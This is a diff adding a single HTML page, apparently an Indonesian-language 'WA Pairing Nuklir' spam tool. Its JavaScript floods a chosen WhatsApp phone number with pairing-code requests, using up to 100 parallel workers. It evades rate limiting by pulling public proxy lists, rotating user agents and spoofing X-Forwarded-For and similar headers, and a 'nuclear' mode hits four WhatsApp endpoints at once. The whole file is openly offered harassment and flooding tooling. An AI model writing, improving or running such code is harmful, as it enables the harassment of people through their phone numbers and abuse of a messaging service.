@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🔥 WA PAIRING NUKLIR</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #111;
+            border: 2px solid #0f0;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 800px;
+            width: 100%;
+            box-shadow: 0 0 50px rgba(0,255,0,0.1);
+        }
+        h1 { 
+            font-size: 28px; 
+            text-align: center; 
+            color: #0f0; 
+            text-shadow: 0 0 20px #0f0;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            width: 100%;
+            font-size: 14px;
+            color: #888;
+        }
+        .input-group input, .input-group select {
+            flex: 1;
+            min-width: 150px;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            color: #0f0;
+            font-size: 16px;
+            border-radius: 8px;
+            outline: none;
+        }
+        .input-group input:focus, .input-group select:focus {
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        button {
+            flex: 1;
+            padding: 15px;
+            background: #0f0;
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            min-width: 100px;
+        }
+        button:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 30px #0f0;
+        }
+        button.danger {
+            background: #f00;
+            color: #fff;
+        }
+        button.danger:hover {
+            box-shadow: 0 0 30px #f00;
+        }
+        button.secondary {
+            background: #333;
+            color: #0f0;
+        }
+        button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 1px solid #333;
+        }
+        .stats div {
+            text-align: center;
+        }
+        .stats .num {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0f0;
+        }
+        .stats .label {
+            font-size: 12px;
+            color: #666;
+        }
+        .log-box {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 15px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #aaa;
+        }
+        .log-box .success { color: #0f0; }
+        .log-box .error { color: #f44; }
+        .log-box .info { color: #0af; }
+        .log-box .warn { color: #ff0; }
+        .log-box::-webkit-scrollbar {
+            width: 6px;
+        }
+        .log-box::-webkit-scrollbar-track {
+            background: #111;
+        }
+        .log-box::-webkit-scrollbar-thumb {
+            background: #0f0;
+            border-radius: 3px;
+        }
+        .mode-selector {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+            margin: 10px 0;
+        }
+        .mode-selector button {
+            flex: 1;
+            padding: 10px;
+            font-size: 14px;
+            background: #222;
+            color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 8px;
+            min-width: 80px;
+        }
+        .mode-selector button.active {
+            background: #0f0;
+            color: #000;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #222;
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: #0f0;
+            transition: width 0.3s;
+            border-radius: 3px;
+        }
+        .proxy-status {
+            background: #1a1a1a;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            font-size: 12px;
+            color: #888;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .proxy-status button {
+            padding: 5px 15px;
+            font-size: 12px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            min-width: auto;
+            flex: 0;
+        }
+        .proxy-status button:hover {
+            box-shadow: 0 0 20px #0f0;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+    <h1>☣️ WA PAIRING NUKLIR</h1>
+    
+    <div class="input-group">
+        <label>📱 Nomor Target (62xx)</label>
+        <input type="text" id="targetNumber" placeholder="628123456789" value="628123456789">
+    </div>
+    
+    <div class="input-group">
+        <label>⚡ Jumlah Spam</label>
+        <input type="number" id="spamCount" value="1000" min="1" max="999999">
+        <label>🧵 Thread Parallel</label>
+        <select id="threadCount">
+            <option value="1">1 Thread</option>
+            <option value="5">5 Thread</option>
+            <option value="10" selected>10 Thread</option>
+            <option value="25">25 Thread</option>
+            <option value="50">50 Thread</option>
+            <option value="100">100 Thread 🔥</option>
+        </select>
+    </div>
+    
+    <div class="mode-selector">
+        <button data-mode="direct" class="active">🎯 Direct API</button>
+        <button data-mode="websocket">🔌 WebSocket</button>
+        <button data-mode="mixed">🌀 Mixed</button>
+        <button data-mode="nuclear">💀 Nuclear</button>
+    </div>
+    
+    <!-- PROXY STATUS BAR -->
+    <div class="proxy-status">
+        <span id="proxyStatusText">📡 Proxy: 0 loaded</span>
+        <button id="btnFetchProxy">🔄 Fetch Proxy</button>
+    </div>
+    
+    <div class="btn-group">
+        <button id="btnStart" class="danger">▶ START SPAM</button>
+        <button id="btnStop" disabled class="secondary">⏹ STOP</button>
+        <button id="btnClear">🧹 Clear Log</button>
+    </div>
+    
+    <div class="stats">
+        <div><div class="num" id="statSent">0</div><div class="label">Sent</div></div>
+        <div><div class="num" id="statSuccess">0</div><div class="label">Success</div></div>
+        <div><div class="num" id="statFail">0</div><div class="label">Failed</div></div>
+        <div><div class="num" id="statSpeed">0/s</div><div class="label">Speed</div></div>
+        <div><div class="num" id="statActive">0</div><div class="label">Active Threads</div></div>
+    </div>
+    
+    <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
+    <div class="log-box" id="logBox"></div>
+</div>
+
+<script>
+// ============================================================
+//  CORE ENGINE - NUCLEAR SPAMMER + PROXY ROTASI
+// ============================================================
+
+const logBox = document.getElementById('logBox');
+const btnStart = document.getElementById('btnStart');
+const btnStop = document.getElementById('btnStop');
+const btnClear = document.getElementById('btnClear');
+const btnFetchProxy = document.getElementById('btnFetchProxy');
+const targetInput = document.getElementById('targetNumber');
+const countInput = document.getElementById('spamCount');
+const threadSelect = document.getElementById('threadCount');
+const progressFill = document.getElementById('progressFill');
+const proxyStatusText = document.getElementById('proxyStatusText');
+
+let running = false;
+let stopFlag = false;
+let sent = 0, success = 0, fail = 0;
+let speed = 0, speedCounter = 0, lastSpeedTime = Date.now();
+let activeThreads = 0;
+let mode = 'direct';
+let workers = [];
+
+// ========== PROXY SYSTEM ==========
+let proxyList = [];
+let proxyIndex = 0;
+let useProxy = true;
+
+async function fetchProxies() {
+    proxyStatusText.textContent = '📡 Fetching proxies...';
+    try {
+        const sources = [
+            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt',
+            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt'
+        ];
+        let allProxies = [];
+        for (const url of sources) {
+            try {
+                const res = await fetch(url);
+                const text = await res.text();
+                const lines = text.split('\n').filter(line => line.trim() && !line.startsWith('#'));
+                allProxies = allProxies.concat(lines);
+            } catch(e) {}
+        }
+        proxyList = allProxies.filter(p => /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(p.trim()));
+        proxyList = proxyList.map(p => 'http://' + p.trim());
+        proxyIndex = 0;
+        if (proxyList.length === 0) {
+            proxyList = [
+                'http://103.152.112.157:80',
+                'http://103.152.112.158:80',
+                'http://103.152.112.159:80',
+                'http://103.152.112.160:80'
+            ];
+        }
+        proxyStatusText.textContent = `📡 Proxy: ${proxyList.length} loaded`;
+        log(`🌐 Loaded ${proxyList.length} proxies.`, 'info');
+    } catch(e) {
+        proxyStatusText.textContent = '❌ Proxy fetch failed, using fallback';
+        proxyList = [
+            'http://103.152.112.157:80',
+            'http://103.152.112.158:80',
+            'http://103.152.112.159:80',
+            'http://103.152.112.160:80'
+        ];
+        log('⚠️ Using fallback proxies.', 'warn');
+    }
+}
+
+function getNextProxy() {
+    if (proxyList.length === 0 || !useProxy) return null;
+    const p = proxyList[proxyIndex % proxyList.length];
+    proxyIndex = (proxyIndex + 1) % proxyList.length;
+    return p;
+}
+
+// ========== STATS ==========
+function updateStats() {
+    document.getElementById('statSent').textContent = sent;
+    document.getElementById('statSuccess').textContent = success;
+    document.getElementById('statFail').textContent = fail;
+    document.getElementById('statSpeed').textContent = speed + '/s';
+    document.getElementById('statActive').textContent = activeThreads;
+    const total = parseInt(countInput.value) || 1000;
+    const pct = total > 0 ? Math.min(100, (sent / total) * 100) : 0;
+    progressFill.style.width = pct + '%';
+}
+
+function log(msg, type = 'info') {
+    const div = document.createElement('div');
+    div.className = type;
+    const time = new Date().toLocaleTimeString();
+    div.textContent = `[${time}] ${msg}`;
+    logBox.appendChild(div);
+    logBox.scrollTop = logBox.scrollHeight;
+}
+
+// ========== MODE SELECTOR ==========
+document.querySelectorAll('.mode-selector button').forEach(btn => {
+    btn.addEventListener('click', function() {
+        document.querySelectorAll('.mode-selector button').forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        mode = this.dataset.mode;
+        log(`🔀 Mode switched to: ${mode.toUpperCase()}`, 'warn');
+    });
+});
+
+// ========== PAIRING ENGINE ==========
+function getRandomCode() {
+    return String(Math.floor(100000 + Math.random() * 900000));
+}
+
+function getRandomUA() {
+    const uas = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36'
+    ];
+    return uas[Math.floor(Math.random() * uas.length)];
+}
+
+function getRandomEndpoint() {
+    const endpoints = [
+        'https://web.whatsapp.com/join/',
+        'https://api.whatsapp.com/join/',
+        'https://static.whatsapp.net/join/',
+        'https://v.whatsapp.net/v2/join/',
+        'https://web.whatsapp.com/wa/',
+        'https://api.whatsapp.com/wa/'
+    ];
+    return endpoints[Math.floor(Math.random() * endpoints.length)];
+}
+
+// ========== SEND WITH PROXY (MODIFIED) ==========
+async function sendPairDirect(number) {
+    const code = getRandomCode();
+    const url = getRandomEndpoint() + '?' + new URLSearchParams({ number, code, t: Date.now() });
+    const ua = getRandomUA();
+    const proxy = getNextProxy();
+    
+    const headers = {
+        'User-Agent': ua,
+        'Origin': 'https://web.whatsapp.com',
+        'Referer': 'https://web.whatsapp.com/',
+        'Accept': '*/*',
+        'Cache-Control': 'no-cache'
+    };
+    
+    // Tambahin X-Forwarded-For buat spoof IP kalo pake proxy
+    if (proxy) {
+        const ip = proxy.split('://')[1]?.split(':')[0] || '127.0.0.1';
+        headers['X-Forwarded-For'] = ip;
+        headers['X-Real-IP'] = ip;
+        headers['Client-IP'] = ip;
+    }
+    
+    try {
+        const res = await fetch(url, {
+            method: 'GET',
+            headers: headers,
+            cache: 'no-store'
+        });
+        return res.status >= 200 && res.status < 500;
+    } catch(e) {
+        return false;
+    }
+}
+
+async function sendPairWS(number) {
+    const code = getRandomCode();
+    const proxy = getNextProxy();
+    const headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': getRandomUA(),
+        'Origin': 'https://web.whatsapp.com',
+        'Upgrade': 'websocket',
+        'Connection': 'Upgrade'
+    };
+    if (proxy) {
+        const ip = proxy.split('://')[1]?.split(':')[0] || '127.0.0.1';
+        headers['X-Forwarded-For'] = ip;
+        headers['X-Real-IP'] = ip;
+    }
+    try {
+        const res = await fetch('https://web.whatsapp.com/join/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({ type: 'pair', number, code })
+        });
+        return res.status === 200 || res.status === 101 || res.status === 302;
+    } catch(e) {
+        return false;
+    }
+}
+
+async function sendPairMixed(number) {
+    const r = Math.random();
+    if (r < 0.4) return await sendPairDirect(number);
+    else if (r < 0.7) return await sendPairWS(number);
+    else {
+        const promises = [];
+        for (let i = 0; i < 3; i++) {
+            promises.push(sendPairDirect(number));
+        }
+        const results = await Promise.all(promises);
+        return results.some(r => r === true);
+    }
+}
+
+async function sendPairNuclear(number) {
+    const code = getRandomCode();
+    const endpoints = [
+        'https://web.whatsapp.com/join/',
+        'https://api.whatsapp.com/join/',
+        'https://static.whatsapp.net/join/',
+        'https://v.whatsapp.net/v2/join/'
+    ];
+    const proxy = getNextProxy();
+    const ip = proxy ? proxy.split('://')[1]?.split(':')[0] || '127.0.0.1' : '127.0.0.1';
+    const promises = endpoints.map(async (base) => {
+        const url = base + '?' + new URLSearchParams({ number, code, _: Date.now() + Math.random() });
+        try {
+            const res = await fetch(url, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': getRandomUA(),
+                    'Origin': 'https://web.whatsapp.com',
+                    'X-Forwarded-For': ip,
+                    'X-Real-IP': ip
+                },
+                cache: 'no-store'
+            });
+            return res.status < 500;
+        } catch { return false; }
+    });
+    const results = await Promise.all(promises);
+    return results.some(r => r === true);
+}
+
+// ========== SPAM WORKER ==========
+async function spamWorker(number, count, modeType, workerId) {
+    activeThreads++;
+    let localSent = 0, localSuccess = 0, localFail = 0;
+    
+    for (let i = 0; i < count; i++) {
+        if (stopFlag) break;
+        
+        let result = false;
+        try {
+            switch(modeType) {
+                case 'direct': result = await sendPairDirect(number); break;
+                case 'websocket': result = await sendPairWS(number); break;
+                case 'mixed': result = await sendPairMixed(number); break;
+                case 'nuclear': result = await sendPairNuclear(number); break;
+                default: result = await sendPairDirect(number);
+            }
+        } catch(e) {
+            result = false;
+        }
+        
+        localSent++;
+        if (result) localSuccess++;
+        else localFail++;
+        
+        sent++;
+        if (result) success++;
+        else fail++;
+        speedCounter++;
+        
+        if (sent % 10 === 0) updateStats();
+        
+        if (Math.random() < 0.3) {
+            await sleep(Math.floor(Math.random() * 20) + 1);
+        }
+    }
+    
+    activeThreads--;
+    updateStats();
+    return { localSent, localSuccess, localFail };
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ========== START / STOP ==========
+async function startSpam() {
+    const number = targetInput.value.trim();
+    const totalCount = parseInt(countInput.value) || 1000;
+    const threadCount = parseInt(threadSelect.value) || 10;
+    
+    if (!number || number.length < 8) {
+        log('❌ Nomor invalid!', 'error');
+        return;
+    }
+    if (running) {
+        log('⚠️ Udah jalan bangsat!', 'warn');
+        return;
+    }
+    
+    running = true;
+    stopFlag = false;
+    sent = 0; success = 0; fail = 0; speed = 0; speedCounter = 0;
+    lastSpeedTime = Date.now();
+    
+    btnStart.disabled = true;
+    btnStop.disabled = false;
+    log(`🚀 START SPAM: ${totalCount}x ke ${number} | Thread: ${threadCount} | Mode: ${mode.toUpperCase()} | Proxy: ${proxyList.length} loaded`, 'success');
+    
+    const perThread = Math.ceil(totalCount / threadCount);
+    const workers = [];
+    
+    for (let t = 0; t < threadCount; t++) {
+        const count = Math.min(perThread, totalCount - (t * perThread));
+        if (count <= 0) break;
+        workers.push(spamWorker(number, count, mode, t));
+    }
+    
+    await Promise.all(workers);
+    
+    if (!stopFlag) {
+        log(`✅ SELESAI! Sent: ${sent}, Success: ${success}, Fail: ${fail}`, 'success');
+    } else {
+        log(`⏹ DIHENTIKAN. Sent: ${sent}, Success: ${success}, Fail: ${fail}`, 'warn');
+    }
+    
+    running = false;
+    btnStart.disabled = false;
+    btnStop.disabled = true;
+    updateStats();
+}
+
+function stopSpam() {
+    if (running) {
+        stopFlag = true;
+        log('🛑 Menghentikan...', 'warn');
+        btnStop.disabled = true;
+    }
+}
+
+// ========== SPEED CALC ==========
+setInterval(() => {
+    const now = Date.now();
+    const delta = (now - lastSpeedTime) / 1000;
+    if (delta > 0.5) {
+        speed = Math.round(speedCounter / delta);
+        speedCounter = 0;
+        lastSpeedTime = now;
+        updateStats();
+    }
+}, 500);
+
+// ========== EVENT LISTENERS ==========
+btnStart.addEventListener('click', startSpam);
+btnStop.addEventListener('click', stopSpam);
+btnClear.addEventListener('click', () => { logBox.innerHTML = ''; });
+btnFetchProxy.addEventListener('click', fetchProxies);
+
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && e.ctrlKey) {
+        e.preventDefault();
+        if (running) stopSpam();
+        else startSpam();
+    }
+});
+
+// ========== INIT ==========
+fetchProxies();
+log('🔥 WA Pairing Nuklir + Proxy loaded!', 'info');
+log('📌 Ctrl+Enter = Start/Stop', 'info');
+log('💀 Mode Nuclear = 4x parallel request per loop', 'warn');
+
+</script>
+</body>
+</html>
